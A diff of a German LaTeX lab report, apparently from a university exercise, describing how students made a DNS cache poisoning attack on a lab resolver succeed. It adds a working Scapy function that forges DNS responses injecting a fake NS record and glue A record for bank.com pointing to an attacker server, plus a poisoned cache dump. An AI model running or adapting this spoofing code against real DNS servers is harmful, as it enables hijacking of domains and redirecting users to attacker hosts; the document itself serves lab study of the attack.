@@ -31,19 +31,10 @@
 \maketitle
 \newpage
 
-\section{Der Fehler}
+\section{Fehler in der Implementierung}
 Nach den Vorträgen und der Besprechung unserer Probleme am 27.01 wurde von Daniel Fett und Guido Schmitz angemerkt, dass eventuell Probleme in der Virtualisierungsschicht von Virtual Box bestehen könnten. Darauf hin wurde das ganze Setup auf einen physikalischen Rechner übertragen und mehrfach erneut getestet. In späteren Tests konnte man sehen, dass das Poisoning sehr wohl erfolgreich war, jedoch nur für A-Records. Erst durch ein Debug-Level von 90 konnten alle benötigt Informationen des DNS-Servers eingesehen werden. Ein höheres Debug-Level, wie in den vorherigen Versuchen, hatte leider zur Folge, dass Speicherausnutzungen usw. angezeigt wurden. Dadurch waren alle wichtigen Informationen im Log des Servers verschollen und schwer per Hand zu finden. Ein weiterer Punkt der uns aufgefallen ist, bestand darin, dass nur ein A-Record \glqq injected\grqq\ wurde anstelle eines NS-Records. Dieses verhalten ergab sich durch mehrfache anfragen der Domain von vorherigen Angriffen. 
 
-Im nächsten Schritt wurden die angepassten Veränderungen erneut in Vagrant eingepflegt und getestet. Anschließend wurde der Angriff mehrfach ausgeführt und konnte auch (noch mit A-Records) umgesetzt werden. Außerdem wurde durch den Angriff klar, dass es sich bei unserer Antwort, nicht wie zuerst gedacht, um eine \glqq authoritative\grqq Antwort handelt muss. Da wir keine Antwort auf die Eigentliche Frage (Query) gesendet haben, darf diese Flag nicht auf den Wert Eins gesetzt werden. Dadurch ergab sich ein neuer Code für den Angriff in folgender Form:
-\begin{center}
-\begin{lstlisting}
-   INPUT IF FINISHED
-\end{lstlisting}
-\end{center}
-
-Obwohl der Server nun gefälschte Antworten akzeptierte, war der Angriff nicht erfolgreich. Die gefälschten NS-Records wurden zwar vom Server abgespeichert, jedoch nur für die angefragte Subdomain. 
-
-Der Server Cache nach einem "erfolgreichen" Angriff sah wie folgt aus:
+Im nächsten Schritt wurden die angepassten Veränderungen erneut in Vagrant eingepflegt und getestet. Anschließend wurde der Angriff mehrfach ausgeführt und konnte auch (noch mit A-Records) umgesetzt werden. Obwohl der Server nun gefälschte Antworten akzeptierte, war der Angriff nicht in vollem Umfang erfolgreich. Die gefälschten NS-Records wurden zwar vom Server abgespeichert, jedoch nur für die angefragte Subdomain. Der Server Cache nach einem \glqq erfolgreichen\grqq\ Angriff sah wie folgt aus:
 \begin{center}
 \begin{lstlisting}
 ; glue
@@ -67,11 +58,50 @@ www291a.bank.com.       3036    NS      ns01.cashparking.com.
 \end{lstlisting}
 \end{center}
 
-\section{Verbesserungen}
-Im Folgenden wird eine kurze Auflistung über unsere Verbesserungen gegeben:
+Nach mehreren weiteren Versuchen war das \glqq injecten\grqq\ eines NS-Records letzendlich möglich. Der Grund dafür lag in mehreren kleineren Fehlern.
 \begin{itemize}
-	\item[1.]	Die Option \emph{aa} von Null auf Eins geändert. 
-	\item[2.]	TODO
+	\item[1.] Bei unseren vorherigen Antworten, haben wir keine vollständige Antwort gesendet, sondern lediglich welcher NS-Server für die Domain zuständig ist.
+	\item[2.] Die Flag für \glqq recursion desired\grqq\ (rd) wurde auf den Wert 1 gesetzt um die Anfrage zu spiegeln. Da im Request bereits eine rekursive Auflösung der IP angefragt wurde, musste dieses Verhalten ebenfalls vom Angreifer gespiegelt werden.
 \end{itemize}
+
+\section{Verbesserungen im Code}
+Durch die aufgezählten Veränderungen, ergab sich auch ein leicht anderer Source-Code für die die Funktion \emph{forged\_ns\_response()}. Die geänderten Codezeilen werden im folgenden Listing farblich hervorgehoben, um die Fehler noch einmal deutlich zu kennzeichnen.
+\begin{center}
+\begin{lstlisting}
+def forged_ns_response(id, target_domain, known_ns_ip):
+    response = Ether() / IP(src=known_ns_ip, dst=victim_dns_ip, flags=2) / UDP(
+        sport=53, dport=victim_dns_port_out) / DNS(
+        id=id,  # Query ID / transaction id
+        qr=1,  # Response
+        opcode=0,  # QUERY
+        aa=1,  # Authoritative answers, as we are sending a response
+        tc=0,  # Not truncated
+        rd=1,  # Mirror request flag
+        ra=1,  # Recursion available
+        z=0,  # Reserved and must be zero
+        rcode=0,  # Response code for "ok"
+        qdcount=1,  # Question record count
+        nscount=1,  # Authority count
+        arcount=1,  # Additional record count
+        ancount=1,  # Answer count
+        # AD and CD bits are defined in RFC 2535
+        ad=0,  # Authentic Data
+        cd=0,  # Checking Disabled
+        # DNS Question Record
+        qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
+        # DNS Resource Record
+        an=DNSRR(rrname=target_domain, type='A', rdata=attacker_dns_ip, ttl=MAX_TTL),
+        ns=DNSRR(rrname=victim_base_domain, type='NS', rdata="forged-ns.bank.com", ttl=MAX_TTL),
+        ar=DNSRR(rrname="forged-ns.bank.com", type='A', rdata=attacker_dns_ip, ttl=MAX_TTL)
+    )
+    return response
+\end{lstlisting}
+\end{center}
+
+Durch die gezeigten Änderungen waren wir letztendlich in der Lage einen gefälschten NS-Record in den Cache des Victim-DNS zu schleusen und somit alle Subdomains unter unsere Kontrolle zu bringen wie auch im folgenden Bild zu sehen ist.
+\begin{figure}
+	\centering
+	\includegraphics[scale=0.5]{successful_attack.jpeg} 
+\end{figure}
 
 \end{document}
